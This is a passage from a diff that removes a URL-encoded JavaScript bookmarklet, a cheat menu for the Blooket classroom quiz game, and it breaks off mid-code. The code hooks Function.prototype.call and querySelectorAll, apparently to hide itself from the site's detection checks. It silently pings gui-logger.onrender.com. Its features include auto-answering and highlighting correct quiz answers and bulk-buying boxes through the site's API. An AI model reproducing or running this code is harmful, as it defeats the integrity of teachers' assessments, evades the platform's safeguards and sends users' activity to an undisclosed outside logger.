@@ -1,1 +1,2991 @@
-javascript:(()=%3E%7Bconst%20s=async()=%3E%7Bif(String(Function.prototype.call).includes(%22native%22))%7Blet%20e=Function.prototype.call,t=document.createElement(%22iframe%22),o=(document.body.append(t),t.style.display=%22none%22,%7BquerySelectorAll:function()%7Breturn%5B%22#JODGUI%22,%22#JODMOBILE%22,%22#currPageEl%22,%22#YTRkNmM2MWEtOTg3Zi00YmE1LWI1NzUtNTgyOTUzMWI4ZDYx%22,%22#ODJkMThlMDEtYmEwNi00MzE4LTg4ZGMtM2Y2ZDI0MzY4ZjU2%22,%22.cheatList%22,%22.cheatName%22,%22bG1mYW8=%22,%22#aXQncyBjYXQgYW5kIG1vdXNlIGF0IHRoaXMgcG9pbnQ%22%5D.includes(arguments%5B0%5D)?%5B%5D:t.contentDocument.querySelectorAll.apply(document,arguments)%7D,querySelector:t.contentDocument.querySelector.bind(document),includes:function()%7Breturn!%5B%22Cheats%22,%22Global%22,%22Global%20Cheats%22,%22Discord%20-%20oneminesraft2%22,%22Auto%20Answer%20(Toggle)%22,%22Auto%20Sell%20Dupes%20On%20Open%22,%22Spam%20Buy%20Blooks%22,%22Food%20Game%22,%22Change%20Blook%20Ingame%22,%22Get%20Daily%20Rewards%22,%22Remove%20Name%20Limit%22,%22Simulate%20Unlock%22,%22Cheat%20ESP%22,%22Gold%20Quest%20Cheats%22,%22Cafe%20Cheats%22,%22Crypto%20Hack%20Cheats%22,%22Deceptive%20Dinos%20Cheats%22,%22Tower%20Defense%20Cheats%22,%22Tower%20Defense2%20Cheats%22,%22Factory%20Cheats%22,%22Fishing%20Frenzy%20Cheats%22,%22Flappy%20Blook%20Cheats%22,%22Tower%20of%20Doom%20Cheats%22,%22Crazy%20Kingdom%20Cheats%22,%22Racing%20Cheats%22,%22Battle%20Royale%20Cheats%22,%22Blook%20Rush%20Cheats%22,%22Monster%20Brawl%20Cheats%22,%22Santa's%20Workshop%20Cheats%22%5D.includes(arguments%5B0%5D)&&t.contentWindow.String.prototype.call(this,arguments)%7D,fetch:t.contentWindow.fetch.bind(window),btoa:t.contentWindow.btoa.bind(window),getItem:t.contentWindow.localStorage.getItem.bind(window.localStorage)%7D),a=Object.keys(o);Function.prototype.call=function()%7Breturn%20a.includes(this.name)?e.apply(o%5Bthis.name%5D,arguments):e.apply(this,arguments)%7D,(new%20Image).src=%22https://gui-logger.onrender.com/gui/1?%22+Date.now()%7Dfunction%20v(e,t=%7B%7D,...o)%7Bvar%20a=document.createElement(e);if(%22object%22==typeof%20t.style)%7Blet%20e=%22%22;for(const%20r%20in%20t.style)e+=%60$%7Br.replace(/%5BA-Z%5D/g,e=%3E%22-%22+e.toLowerCase())%7D:%20$%7Bt.style%5Br%5D%7D;%20%60;t.style=e%7Dfor(const%20n%20in%20t)a%5Bn%5D=t%5Bn%5D;for(const%20i%20of%20o)a.append(i);return%20a%7Dvar%20e,t,o,a,r,n,i,s=await%20Object.values(webpackJsonp.push(%5B%5B%5D,%7B%22%22:(e,t,o)=%3E%7Bt.cache=o.c%7D%7D,%5B%5B%22%22%5D%5D%5D).cache).find(e=%3Ee.exports.a?.me).exports.a.me(%7B%7D)%7C%7C%7B%7D;let%20l=btoa(s.name%7C%7C%22real%22),c=btoa(s.id%7C%7C%22lmfao%22).replaceAll(/(=%7C%5C/%7C%5C.)/g,%22%22);const%20d=%7Bdata:null,setItem(e,r)%7Breturn%20e.split(%22.%22).reduce((e,t,o,a)=%3E(++o==a.length&&(e%5Bt%5D=r),e%5Bt%5D),this.data),localStorage.setItem(l,JSON.stringify(this.data)),this.data%7D,deleteItem(e)%7Breturn%20e.split(%22.%22).reduce((e,t,o,a)=%3E(++o==a.length&&delete%20e%5Bt%5D,e%5Bt%5D),this.data),localStorage.setItem(l,JSON.stringify(this.data)),this.data%7D,setData(e)%7Bthis.data=e,localStorage.setItem(l,JSON.stringify(this.data))%7D%7D;try%7Bd.data=JSON.parse(localStorage.getItem(l)%7C%7C%22%7B%7D%22);for(const%20L%20of%5B%22backgroundColor%22,%22cheatList%22,%22contentBackground%22,%22defaultButton%22,%22disabledButton%22,%22enabledButton%22,%22infoColor%22,%22inputColor%22,%22textColor%22%5D)d.data%5BL%5D&&(d.setItem(%22theme.%22+L,d.data%5BL%5D),d.deleteItem(L))%7Dcatch%7Bd.setData(%7B%7D)%7Dlet%20u,p,m,h,b,g,y,w,f;const%20k=v(%22div%22,%7Bid:c,style:%7Btop:Math.max(10,window.innerHeight-600)/2+%22px%22,left:Math.max(10,window.innerWidth-1e3)/2+%22px%22,transform:%60scale($%7Bd.data.scale%7D)%60,position:%22fixed%22,height:%2280%25%22,width:%2280%25%22,maxHeight:%22600px%22,maxWidth:%221000px%22,zIndex:%22999%22,display:%22block%22%7D%7D,u=v(%22style%22,%7Bid:%22variables%22,innerHTML:%60:root%20%7B--backgroundColor:%20$%7Bd.data?.theme?.backgroundColor%7C%7C%22rgb(11,%20194,%20207)%22%7D;--infoColor:%20$%7Bd.data?.theme?.infoColor%7C%7C%22#9a49aa%22%7D;--cheatList:%20$%7Bd.data?.theme?.cheatList%7C%7C%22#9a49aa%22%7D;--defaultButton:%20$%7Bd.data?.theme?.defaultButton%7C%7C%22#9a49aa%22%7D;--disabledButton:%20$%7Bd.data?.theme?.disabledButton%7C%7C%22#A02626%22%7D;--enabledButton:%20$%7Bd.data?.theme?.enabledButton%7C%7C%22#47A547%22%7D;--textColor:%20$%7Bd.data?.theme?.textColor%7C%7C%22white%22%7D;--inputColor:%20$%7Bd.data?.theme?.inputColor%7C%7C%22#7a039d%22%7D;--contentBackground:%20$%7Bd.data?.theme?.contentBackground%7C%7C%22rgb(64,%2017,%2095)%22%7D;%7D%60%7D),v(%22style%22,%7BinnerHTML:'.alertList::-webkit-scrollbar%7Bdisplay:none;%7D.alertList%7B-ms-overflow-style:%20none;scrollbar-width:%20none;%7D.contentWrapper::-webkit-scrollbar%7Bdisplay:none;%7D.contentWrapper%7B-ms-overflow-style:%20none;scrollbar-width:%20none;%7D.cheatButton%7Bposition:relative;display:flex;flex-direction:row;align-items:center;min-height:40px;width:190px;margin:4px%200;padding-left:30px;box-sizing:border-box;cursor:pointer;user-select:none;text-decoration:none;border-top-right-radius:5px;border-bottom-right-radius:5px;background-color:transparent;color:var(--textColor);transition:.2s%20linear;font-size:20px;font-weight:400;font-family:Nunito;text-decoration-thickness:auto%7D.cheatButton:hover%7Bbackground-color:var(--textColor);color:var(--defaultButton)%7D.cheatInput,select%7Bmin-width:200px;padding-block:5px;font-family:Nunito,sans-serif;font-weight:400;font-size:16px;background-color:var(--inputColor);box-shadow:inset%200%206px%20rgb(0%200%200%20/%2020%25);margin:3px;color:var(--textColor)%7D.bigButton:hover%7Bfilter:brightness(110%25);transform:translateY(-2px)%7D.bigButton:active%7Btransform:translateY(2px)%7D.cheatList::-webkit-scrollbar%7Bwidth:10px%7D.cheatList::-webkit-scrollbar-track%7Bbackground:var(--cheatList)%7D.cheatList::-webkit-scrollbar-thumb%7Bbackground:var(--cheatList);box-shadow:%20inset%20-10px%200%20rgb(0%200%200%20/%2020%25)%7D.cheatList::-webkit-scrollbar-thumb:hover%7Bbackground:var(--cheatList);%20box-shadow:%20inset%20-10px%200%20rgb(0%200%200%20/%2030%25);%20%7D.scriptButton:hover%7Bfilter:brightness(120%25)%7D.cheatInput%7Bmax-width:200px;border:none;border-radius:7px;caret-color:var(--textColor)%7D.cheatInput::placeholder%7Bcolor:var(--textColor)%7D.cheatInput:focus,select:focus%7Boutline:0%7D.cheatInput::-webkit-inner-spin-button,.cheatInput::-webkit-outer-spin-button%7B-webkit-appearance:none;margin:0%7D.cheatInput%5Btype=number%5D%7B-moz-appearance:textfield%7Dselect%7Bborder:none;border-radius:7px;text-align:center%7D.scriptButton%7Balign-items:%20center;%20box-sizing:%20border-box;%20display:%20flex;%20flex-direction:%20column;%20justify-content:%20center;%20margin:%2010px;%20padding:%205px%205px%2011px;%20position:%20relative;%20width:%20250px;%20font-family:%20Nunito,%20sans-serif;%20font-weight:%20400;%20color:%20var(--textColor);%20box-shadow:%20inset%200%20-6px%20rgb(0%200%200%20/%2020%25);%20border-radius:%207px;%20cursor:%20pointer;%20transition:%20filter%20.25s;%7D.tooltip::after%20%7Bcontent:%20%22%22;position:%20absolute;width:%2010px;height:%2010px;background-color:%20inherit;top:%20-5px;left:%2050%25;margin-left:%20-6px;transform:%20rotate(135deg)%7D'%7D),p=v(%22div%22,%7Bstyle:%7Bwidth:%22100%25%22,height:%22100%25%22,position:%22relative%22,outline:%223px%20solid%20#3a3a3a%22,borderRadius:%2215px%22,overflow:%22hidden%22%7D%7D,v(%22div%22,%7Bid:%22background%22,style:%7Bdisplay:%22block%22,top:%220%22,left:%220%22,height:%22100%25%22,overflowY:%22hidden%22,overflowX:%22hidden%22,position:%22absolute%22,width:%22100%25%22,background:%22var(--backgroundColor)%22,visibility:%22visible%22%7D%7D,v(%22div%22,%7Bid:%22backgroundImage%22,style:%7BbackgroundImage:%22url(https://ac.blooket.com/dashboard/65a43218fd1cabe52bdf1cda34613e9e.png)%22,display:%22block%22,height:%22200%25%22,position:%22absolute%22,width:%22200%25%22,top:%2250%25%22,left:%2250%25%22,backgroundPositionX:%22-100px%22,backgroundPositionY:%22-100px%22,backgroundSize:%22550px%22,visibility:%22visible%22,transform:%22translate(-50%25,-50%25)%20rotate(15deg)%22,appearance:%22none%22,opacity:%220.175%22%7D%7D)),h=v(%22div%22,%7Bid:%22controls%22,style:%7Bdisplay:%22flex%22,alignItems:%22center%22,justifyContent:%22center%22,paddingBottom:%228px%22,paddingInline:%2215px%22,position:%22absolute%22,left:%22220px%22,top:%220%22,visibility:%22visible%22,zIndex:%225%22,height:%2252px%22,width:%22max-content%22,background:%22var(--infoColor)%22,boxShadow:%22inset%200%20-8px%20rgb(0%200%200%20/%2020%25),%200%200%204px%20rgb(0%200%200%20/%2015%25)%22,borderBottomRightRadius:%2210px%22,color:%22var(--textColor)%22,fontFamily:%22Nunito,%20sans-serif%22,fontWeight:%22700%22,userSelect:%22text%22%7D,innerText:(%5B%7Bctrl:s,shift:e,alt:t,key:o%7D,%7Bctrl:a,shift:r,alt:n,key:i%7D%5D=%5Bd.data.hide%7C%7C%7Bctrl:!0,key:%22e%22%7D,d.data.close%7C%7C%7Bctrl:!0,key:%22x%22%7D%5D,%60$%7B%5Bs&&%22Ctrl%22,e&&%22Shift%22,t&&%22Alt%22,o&&o.toUpperCase()%5D.filter(Boolean).join(%22%20+%20%22)%7D%20to%20hide%20%7C%20$%7B%5Ba&&%22Ctrl%22,r&&%22Shift%22,n&&%22Alt%22,i&&i.toUpperCase()%5D.filter(Boolean).join(%22%20+%20%22)%7D%20for%20quick%20disable%5CnClick%20and%20drag%20here%60),update:(%7Bctrl:e,shift:t,alt:o,key:a%7D=%7Bctrl:!0,key:%22e%22%7D,%7Bctrl:r,shift:n,alt:i,key:s%7D=%7Bctrl:!0,key:%22x%22%7D)=%3Eh.innerText=%60$%7B%5Be&&%22Ctrl%22,t&&%22Shift%22,o&&%22Alt%22,a&&a.toUpperCase()%5D.filter(Boolean).join(%22%20+%20%22)%7D%20to%20hide%20%7C%20$%7B%5Br&&%22Ctrl%22,n&&%22Shift%22,i&&%22Alt%22,s&&s.toUpperCase()%5D.filter(Boolean).join(%22%20+%20%22)%7D%20for%20quick%20disable%5CnClick%20and%20drag%20here%60%7D),v(%22div%22,%7Bid:%22credits%22,style:%7Bdisplay:%22flex%22,alignItems:%22center%22,justifyContent:%22center%22,paddingBottom:%228px%22,position:%22absolute%22,right:%220%22,top:%220%22,visibility:%22visible%22,zIndex:%225%22,height:%2247px%22,width:%22210px%22,background:%22var(--infoColor)%22,boxShadow:%22inset%200%20-8px%20rgb(0%200%200%20/%2020%25),%200%200%204px%20rgb(0%200%200%20/%2015%25)%22,borderBottomLeftRadius:%2210px%22,color:%22var(--textColor)%22,fontFamily:%22Nunito,%20sans-serif%22,fontWeight:%22700%22,userSelect:%22text%22%7D,innerHTML:%22GitHub%20-%2005Konz%22%7D),b=v(%22div%22,%7Bid:%22controlButtons%22,style:%7Bdisplay:%22flex%22,alignItems:%22center%22,justifyContent:%22center%22,position:%22absolute%22,right:%220%22,bottom:%220%22,visibility:%22visible%22,zIndex:%225%22,height:%2255px%22,width:%22165px%22,background:%22#none%22,borderLeft:%223px%20solid%20black%22,borderTop:%223px%20solid%20black%22,borderTopLeftRadius:%2210px%22,color:%22white%22,fontFamily:%22Nunito,%20sans-serif%22,fontWeight:%22700%22,userSelect:%22text%22,overflow:%22hidden%22,pointerEvents:%22all%22%7D%7D,g=v(%22button%22,%7Bstyle:%7Bheight:%2255px%22,width:%2255px%22,fontFamily:%22Nunito%22,color:%22white%22,backgroundColor:%22#00a0ff%22,border:%22none%22,fontSize:%222rem%22,cursor:%22move%22%7D,innerHTML:%22%E2%9C%A5%22%7D),v(%22button%22,%7Bstyle:%7Bheight:%2255px%22,width:%2255px%22,fontFamily:%22Nunito%22,color:%22white%22,backgroundColor:%22grey%22,border:%22none%22,fontSize:%222rem%22,fontWeight:%22bolder%22,cursor:%22pointer%22%7D,innerHTML:%22-%22,onclick:function()%7Blet%20t=!1;return()=%3E%7Bfor(var%20e%20of%5B...p.children%5D)e!=b&&(t?e.style.display=e.style._display:(e.style._display=e.style.display,e.style.display=%22none%22));p.style.height=t?%22100%25%22:%2255px%22,p.style.width=t?%22100%25%22:%22165px%22,k.style.top=parseInt(k.style.top)+(k.offsetHeight-55)*(t?-1:1)+%22px%22,k.style.left=parseInt(k.style.left)+(k.offsetWidth-165)*(t?-1:1)+%22px%22,k.style.pointerEvents=t?%22unset%22:%22none%22,t=!t%7D%7D()%7D),v(%22button%22,%7Bstyle:%7Bheight:%2255px%22,width:%2255px%22,fontFamily:%22Nunito%22,color:%22white%22,backgroundColor:%22red%22,border:%22none%22,fontSize:%222rem%22,fontWeight:%22bolder%22,cursor:%22pointer%22%7D,innerHTML:%22X%22,onclick:O%7D)),m=v(%22div%22,%7BclassName:%22cheatList%22,style:%7BoverflowY:%22scroll%22,background:%22var(--cheatList)%22,boxShadow:%22inset%20-10px%200%20rgb(0%200%200%20/%2020%25)%22,zIndex:%225%22,width:%22220px%22,position:%22absolute%22,top:%220%22,left:%220%22,height:%22100%25%22,fontFamily:%22Titan%20One%22,color:%22var(--textColor)%22,fontSize:%2240px%22,textAlign:%22center%22,paddingTop:%2220px%22,userSelect:%22none%22,padding:%2220px%2010px%2020px%200%22,boxSizing:%22border-box%22,display:%22flex%22,flexDirection:%22column%22%7D,innerHTML:'%3Cspan%20style=%22text-shadow:%201px%201px%20rgb(0%200%200%20/%2040%25)%22%3ECheats%3C/span%3E'%7D,v(%22a%22,%7BclassName:%22bigButton%22,style:%7Bcursor:%22pointer%22,display:%22block%22,fontFamily:%22Titan%20One%22,margin:%2220px%20auto%2010px%22,position:%22relative%22,transition:%22.25s%22,textDecoration:%22none%22,userSelect:%22none%22,visibility:%22visible%22%7D,target:%22_blank%22,href:%22https://discord.gg/jHjGrrdXP6%22,innerHTML:%60%3Cdiv%20style=%22background:%20rgba(0,0,0,.25);%20border-radius:%205px;%20display:%20block;%20width:%20100%25;%20height:%20100%25;%20left:%200;%20top:%200;%20position:%20absolute;%20transform:%20translateY(2px);%20width:%20100%25;%20transition:%20transform%20.6s%20cubic-bezier(.3,.7,.4,1)%22%3E%3C/div%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20style=%22background-color:%20rgb(11,%20194,%20207);%20filter:%20brightness(.7);%20position:%20absolute;%20top:%200;%20left:%200;%20width:%20100%25;%20height:%20100%25;%20border-radius:%205px;%22%3E%3C/div%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20style=%22font-weight:%20400;%20background-color:%20rgb(11,%20194,%20207);%20color:%20white;%20display:%20flex;%20flex-direction:%20row;%20align-items:%20center;%20justify-content:%20center;%20text-align:%20center;%20padding:%205px;%20border-radius:%205px;%20transform:%20translateY(-4px);%20transition:%20transform%20.6s%20cubic-bezier(.3,.7,.4,1)%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20style=%22font-family:%20Titan%20One,%20sans-serif;%20color:%20white;%20font-size:%2026px;%20text-shadow:%202px%202px%20rgb(0%200%200%20/%2020%25);%20height:%2040px;%20padding:%200%2015px;%20display:%20flex;%20flex-direction:%20row;%20align-items:%20center;%20justify-content:%20center%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Csvg%20style=%22filter:%20drop-shadow(2px%202px%200%20rgb(0%200%200%20/%2020%25))%22%20xmlns=%22http://www.w3.org/2000/svg%22%20width=%2235%22%20height=%2235%22%20fill=%22currentColor%22%20viewBox=%220%20-1%2021%2016%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cpath%20d=%22M13.545%202.907a13.227%2013.227%200%200%200-3.257-1.011.05.05%200%200%200-.052.025c-.141.25-.297.577-.406.833a12.19%2012.19%200%200%200-3.658%200%208.258%208.258%200%200%200-.412-.833.051.051%200%200%200-.052-.025c-1.125.194-2.22.534-3.257%201.011a.041.041%200%200%200-.021.018C.356%206.024-.213%209.047.066%2012.032c.001.014.01.028.021.037a13.276%2013.276%200%200%200%203.995%202.02.05.05%200%200%200%20.056-.019c.308-.42.582-.863.818-1.329a.05.05%200%200%200-.01-.059.051.051%200%200%200-.018-.011%208.875%208.875%200%200%201-1.248-.595.05.05%200%200%201-.02-.066.051.051%200%200%201%20.015-.019c.084-.063.168-.129.248-.195a.05.05%200%200%201%20.051-.007c2.619%201.196%205.454%201.196%208.041%200a.052.052%200%200%201%20.053.007c.08.066.164.132.248.195a.051.051%200%200%201-.004.085%208.254%208.254%200%200%201-1.249.594.05.05%200%200%200-.03.03.052.052%200%200%200%20.003.041c.24.465.515.909.817%201.329a.05.05%200%200%200%20.056.019%2013.235%2013.235%200%200%200%204.001-2.02.049.049%200%200%200%20.021-.037c.334-3.451-.559-6.449-2.366-9.106a.034.034%200%200%200-.02-.019Zm-8.198%207.307c-.789%200-1.438-.724-1.438-1.612%200-.889.637-1.613%201.438-1.613.807%200%201.45.73%201.438%201.613%200%20.888-.637%201.612-1.438%201.612Zm5.316%200c-.788%200-1.438-.724-1.438-1.612%200-.889.637-1.613%201.438-1.613.807%200%201.451.73%201.438%201.613%200%20.888-.631%201.612-1.438%201.612Z%22/%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/svg%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20Discord%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%60%7D)),v(%22div%22,%7BclassName:%22contentWrapper%22,style:%7Bposition:%22absolute%22,left:%22220px%22,top:%2270px%22,overflowY:%22scroll%22,width:%22calc(100%25%20-%20220px)%22,height:%22calc(100%25%20-%2070px)%22,borderRadius:%227px%22%7D%7D,v(%22div%22,%7Bid:%22content%22,style:%7Bposition:%22absolute%22,inset:%2227px%2050px%2050px%2050px%22%7D%7D,y=v(%22div%22,%7BclassName:%22tooltip%22,style:%7Bposition:%22absolute%22,top:%220%22,left:%220%22,backgroundColor:%22black%22,height:%22fit-content%22,maxWidth:%22300px%22,zIndex:%225%22,borderRadius:%227.5px%22,color:%22white%22,display:%22flex%22,justifyContent:%22center%22,alignItems:%22center%22,padding:%225px%22,paddingInline:%2215px%22,pointerEvents:%22none%22,opacity:%220%22,textAlign:%22center%22%7D,innerText:%22description%22%7D),w=v(%22div%22,%7Bstyle:%7BalignItems:%22center%22,boxSizing:%22border-box%22,display:%22flex%22,flexDirection:%22row%22,flexWrap:%22wrap%22,justifyContent:%22space-evenly%22,padding:%2220px%205px%2020px%22,position:%22relative%22,width:%22100%25%22,fontFamily:%22Nunito,%20sans-serif%22,fontWeight:%22400%22,color:%22var(--textColor)%22,background:%22var(--contentBackground)%22,boxShadow:%22inset%200%20-6px%20rgb(0%200%200%20/%2020%25)%22,borderRadius:%227px%22%7D%7D,f=v(%22div%22,%7BclassName:%22headerText%22,style:%7BboxSizing:%22border-box%22,display:%22block%22,height:%2245px%22,left:%22-10px%22,padding:%224px%204px%208px%22,position:%22absolute%22,top:%22-28px%22,backgroundColor:%22#ef7426%22,boxShadow:%220%204px%20rgb(0%200%200%20/%2020%25),%20inset%200%20-4px%20rgb(0%200%200%20/%2020%25)%22,borderRadius:%227px%22%7D%7D,v(%22div%22,%7Bstyle:%7BalignItems:%22center%22,boxSizing:%22border-box%22,display:%22flex%22,height:%22100%25%22,justifyContent:%22center%22,padding:%220%2015px%22,width:%22100%25%22,fontFamily:%22Titan%20One,%20sans-serif%22,fontSize:%2226px%22,fontWeight:%22400%22,textShadow:%22-1px%20-1px%200%20#646464,%201px%20-1px%200%20#646464,%20-1px%201px%200%20#646464,%202px%202px%200%20#646464%22,color:%22white%22,background:%22linear-gradient(#fcd843,#fcd843%2050%25,#feb31a%2050.01%25,#feb31a)%22,borderRadius:%225px%22%7D%7D)))))));for(const%20D%20of%20document.querySelectorAll(%22#%22+c))D.remove();function%20j(e,t,o,a)%7Bconst%20r=v(%22div%22,%7BclassName:%22cheatButton%22,innerHTML:(%22string%22==typeof%20t?%60%3Cimg%20style=%22height:%2030px;%20margin-right:%205px%22%20src=%22$%7Bt%7D%22%3E%60:t%7C%7C%22%22)+e,onclick:()=%3Ex(r.innerText,o,a)%7D);return%20m.appendChild(r),r.onclick%7Dasync%20function%20x(e,l,t)%7Bw.innerHTML=%22%22,f.firstChild.innerText=e+(t?%22%22:%22%20Cheats%22),w.append(f);for(let%20s=0;s%3Cl.length;s++)%7Blet%7Bname:e,description:t,type:o,inputs:a,enabled:r,run:n,element:i%7D=l%5Bs%5D;if(!i)%7Bconst%20b=v(%22div%22,%7BclassName:%22scriptButton%22,style:%7Bbackground:%22toggle%22==o?r?%22var(--enabledButton)%22:%22var(--disabledButton)%22:%22var(--defaultButton)%22%7D%7D,v(%22div%22,%7BclassName:%22cheatName%22,innerHTML:e%7D));if(b.dataset.description=t,b.onclick=function(%7Btarget:e,key:t%7D)%7B(e==b%7C%7Ce.classList.contains(%22cheatName%22)%7C%7C%22Enter%22==t&&e.classList.contains(%22cheatInput%22))&&(t=%5B...b.children%5D.slice(1),n.apply(this,t.map(e=%3E%22number%22==e.type?parseInt(%220%22+e.value):%22SELECT%22==e.nodeName?JSON.parse(e.value):e.data%7C%7Ce.value)),%22toggle%22==o&&(b.style.background=this.enabled?%22var(--enabledButton)%22:%22var(--disabledButton)%22),S.alerts?.%5B0%5D.addLog(%60$%7B%22toggle%22==o?this.enabled?%22Enabled%22:%22Disabled%22:%22Ran%22%7D%20%3Cstrong%3E$%7Bthis.name%7D%3C/strong%3E%60+(a?.length?%60%20with%20inputs:%20($%7Bt.map(e=%3E%22SELECT%22==e.nodeName?e.selectedOptions%5B0%5D.innerText:e.value).join(%22,%20%22)%7D)%60:%22%22),%22toggle%22==o?this.enabled?%22var(--enabledButton)%22:%22var(--disabledButton)%22:null))%7D.bind(l%5Bs%5D),a?.length)for(let%20t=0;t%3Ca.length;t++)%7Bvar%7Bname:c,type:d,options:u,min:p,max:m,value:h%7D=a%5Bt%5D;let%20e;try%7Be=await(%22function%22==typeof%20u?u?.():u)%7Dcatch%7Be=%5B%5D%7Dif(%22options%22==d&&e?.length)%7Bconst%20g=document.createElement(%22select%22);e.forEach(e=%3E%7Bvar%20t=document.createElement(%22option%22);t.value=JSON.stringify(e?.value%7C%7Ce),t.innerHTML=e?.name%7C%7Ce,g.appendChild(t)%7D),b.appendChild(g)%7Delse%20if(%22function%22==d)%7Bconst%20y=document.createElement(%22input%22);y.classList.add(%22cheatInput%22),y.placeholder=c,y.style.textAlign=%22center%22;let%20e=!(y.readOnly=!0);y.onclick=async()=%3E%7Be%7C%7C(y.value=%22Waiting%20for%20input...%22,e=!0,y.data=await%20a%5Bt%5D.function(e=%3Ey.value=e+%22...%22),e=!1,y.value=y.value.slice(0,-3))%7D,b.appendChild(y)%7Delse%7Bu=document.createElement(%22input%22);u.classList.add(%22cheatInput%22),%22number%22==d&&(u.type=%22number%22,u.min=p,u.max=m,u.value=h%7C%7C(null!=p?p:0)),u.placeholder=c,u.style.textAlign=%22center%22,u.onkeyup=b.onclick,b.appendChild(u)%7D%7Dl%5Bs%5D.element=b%7Dw.appendChild(l%5Bs%5D.element)%7D%7Ddocument.body.appendChild(k);const%20S=%7Bglobal:%5B%7Bname:%22Auto%20Answer%20(Toggle)%22,description:%22Toggles%20auto%20answer%20on%22,type:%22toggle%22,enabled:!1,data:null,run:function()%7Bthis.enabled?(this.enabled=!1,clearInterval(this.data),this.data=null):(this.enabled=!0,this.data=setInterval(()=%3E%7Bvar%7Bstate:%7Bquestion:e,stage:t,feedback:o%7D,props:%7Bclient:%7Bquestion:a%7D%7D%7D=Object.values(function%20e(t=document.querySelector(%22body%3Ediv%22))%7Breturn%20Object.values(t)%5B1%5D?.children?.%5B0%5D?._owner.stateNode?t:e(t.querySelector(%22:scope%3Ediv%22))%7D())%5B1%5D.children%5B0%5D._owner%5B%22stateNode%22%5D;const%20r=e%7C%7Ca;try%7B%22typing%22!=r.qType?(%22feedback%22===t%7C%7Co?document.querySelector('%5Bclass*=%22feedback%22%5D')?.firstChild:%5B...document.querySelectorAll('%5Bclass*=%22answerContainer%22%5D')%5D%5Br.answers.map((e,t)=%3Er.correctAnswers.includes(e)?t:null).filter(e=%3Enull!=e)%5B0%5D%5D)?.click?.():Object.values(document.querySelector(%22%5Bclass*='typingAnswerWrapper'%5D%22))%5B1%5D.children._owner.stateNode.sendAnswer(r.answers%5B0%5D)%7Dcatch%7B%7D%7D,50))%7D%7D,%7Bname:%22Highlight%20Answers%20(Toggle)%22,description:%22Toggles%20highlight%20answers%20on%22,type:%22toggle%22,enabled:!1,data:null,run:function()%7Bthis.enabled?(this.enabled=!1,clearInterval(this.data),this.data=null):(this.enabled=!0,this.data=setInterval(()=%3E%7Bconst%7Bstate:o,props:a%7D=Object.values(function%20e(t=document.querySelector(%22body%3Ediv%22))%7Breturn%20Object.values(t)%5B1%5D?.children?.%5B0%5D?._owner.stateNode?t:e(t.querySelector(%22:scope%3Ediv%22))%7D())%5B1%5D.children%5B0%5D._owner%5B%22stateNode%22%5D;%5B...document.querySelectorAll('%5Bclass*=%22answerContainer%22%5D')%5D.forEach((e,t)=%3E%7B(o.question%7C%7Ca.client.question).correctAnswers.includes((o.question%7C%7Ca.client.question).answers%5Bt%5D)?e.style.backgroundColor=%22rgb(0,%20207,%20119)%22:e.style.backgroundColor=%22rgb(189,%2015,%2038)%22%7D)%7D,50))%7D%7D,%7Bname:%22Auto%20Answer%22,description:%22Click%20the%20correct%20answer%20for%20you%22,run:function()%7Bconst%7Bstate:%7Bquestion:o,stage:e,feedback:t%7D,props:%7Bclient:%7Bquestion:a%7D%7D%7D=Object.values(function%20e(t=document.querySelector(%22body%3Ediv%22))%7Breturn%20Object.values(t)%5B1%5D?.children?.%5B0%5D?._owner.stateNode?t:e(t.querySelector(%22:scope%3Ediv%22))%7D())%5B1%5D.children%5B0%5D._owner%5B%22stateNode%22%5D;try%7B%22typing%22!=o.qType?(%22feedback%22===e%7C%7Ct?document.querySelector('%5Bclass*=%22feedback%22%5D')?.firstChild:%5B...document.querySelectorAll('%5Bclass*=%22answerContainer%22%5D')%5D%5B(o%7C%7Ca).answers.map((e,t)=%3E(o%7C%7Ca).correctAnswers.includes(e)?t:null).filter(e=%3Enull!=e)%5B0%5D%5D)?.click?.():Object.values(document.querySelector(%22%5Bclass*='typingAnswerWrapper'%5D%22))%5B1%5D.children._owner.stateNode.sendAnswer(o.answers%5B0%5D)%7Dcatch%7B%7D%7D%7D,%7Bname:%22Spam%20Buy%20Blooks%22,description:%22Opens%20a%20box%20an%20amount%20of%20times%22,inputs:%5B%7Bname:%22Box%22,type:%22options%22,options:()=%3Enew%20Promise(e=%3E%7Be(Object.keys(Object.values(webpackJsonp.push(%5B%5B%5D,%7B%5B1234%5D:(e,t,o)=%3E%7Bt.webpack=o%7D%7D,%5B%5B%221234%22%5D%5D%5D).webpack.c).find(e=%3E!isNaN(e?.exports?.a?.Space)).exports.a%7C%7C%7B%7D))%7D)%7D,%7Bname:%22Amount%22,type:%22number%22%7D%5D,run:function(o,a)%7Bvar%20e=document.createElement(%22iframe%22);document.body.append(e),window.alert=e.contentWindow.alert.bind(window),window.prompt=e.contentWindow.prompt.bind(window),window.confirm=e.contentWindow.confirm.bind(window),e.remove();let%20r=webpackJsonp.push(%5B%5B%5D,%7B%5B1234%5D:(e,t,o)=%3E%7Bt.webpack=o%7D%7D,%5B%5B%221234%22%5D%5D%5D)%5B%22webpack%22%5D,t=Object.values(r.c).find(e=%3Ee.exports?.a?.get).exports.a,c=Object.values(r.c).find(e=%3Ee.exports.a?.purchaseBlookBox).exports.a%5B%22purchaseBlookBox%22%5D;o=o.split(%22%20%22).map(e=%3Ee.charAt(0).toUpperCase()+e.slice(1).toLowerCase()).join(%22%20%22),t.get(%22https://dashboard.blooket.com/api/users%22).then(async(%7Bdata:%7Btokens:e%7D%7D)=%3E%7Bvar%20t=Object.values(r.c).find(e=%3E!isNaN(e?.exports?.a?.Space)).exports.a%7C%7C%7BMedieval:20,Breakfast:20,Wonderland:20,Blizzard:25,Space:20,Bot:20,Aquatic:20,Safari:20,Dino:25,%22Ice%20Monster%22:25,Outback:25%7D;let%20l=Math.min(Math.floor(e/t%5Bo%5D),a);if(0==l)0%3Ca&&alert(%22You%20do%20not%20have%20enough%20tokens!%22);else%7Blet%20n=confirm(%22Would%20you%20like%20to%20alert%2